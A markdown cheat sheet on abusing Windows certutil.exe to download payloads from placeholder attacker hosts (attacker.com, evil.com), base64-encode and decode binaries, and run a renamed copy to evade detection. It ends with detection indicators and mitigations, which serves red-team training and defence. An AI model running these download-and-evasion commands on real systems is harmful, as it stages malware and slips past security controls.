# 📥 Certutil - Living Off the Land

**Certutil.exe** is a command-line utility that comes pre-installed on all modern Windows systems. While it’s designed to manage certificates, attackers use it to **download payloads**, **bypass controls**, and **evade detection** — all without triggering antivirus tools.

> ⚠️ These techniques are for educational use in labs only.

---

## 🛠️ What It Does
Certutil is used by attackers to:
- Download files over HTTP/HTTPS
- Encode/decode base64
- Transfer data between systems
- Masquerade payloads as legitimate tools

---

## 💣 Common LotL Certutil Techniques

### 1. Download a File from Remote Server
```cmd
certutil -urlcache -split -f http://attacker.com/beacon.exe beacon.exe
```
✅ Stealthily downloads a payload from a remote location to disk

---

### 2. Encode a Binary to Base64
```cmd
certutil -encode beacon.exe beacon.txt
```
✅ Useful for evading upload filters or storing binaries in text fields

---

### 3. Decode Base64 to Executable
```cmd
certutil -decode beacon.txt beacon.exe
```
✅ Reconstructs the original binary from an encoded payload

---

### 4. Download via HTTPS with Minimal Logs
```cmd
certutil -urlcache -f https://evil.com/agent.ps1 agent.ps1
```
✅ Works over HTTPS and may bypass weak firewall filters

---

### 5. Masquerade Payload with Renamed Utility
```cmd
copy C:\Windows\System32\certutil.exe updater.exe
updater.exe -urlcache -split -f http://attacker.com/agent.ps1 agent.ps1
```
✅ Renames certutil to evade static command name detections

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| Suspicious certutil usage | Alert on unusual `-urlcache` downloads |
| Unexpected file writes | Watch for downloads into `Public`, `Temp`, or user directories |
| Base64 encoding | Detect usage of `-encode` and `-decode` flags |
| Renamed certutil | Hunt for hash matches or renamed binaries |

---

## 🔐 Mitigation
- Restrict internet access from `certutil.exe` via EDR or firewall
- Monitor logs for CLI usage of `certutil` with suspicious arguments
- Use AppLocker or WDAC to block unsigned or renamed certutil binaries
- Alert on command-line patterns including URLs or `.ps1`, `.exe`, `.dll` extensions

---

> 🧪 Combine certutil with `mshta` or `powershell` for multi-stage attacks (see labs folder)
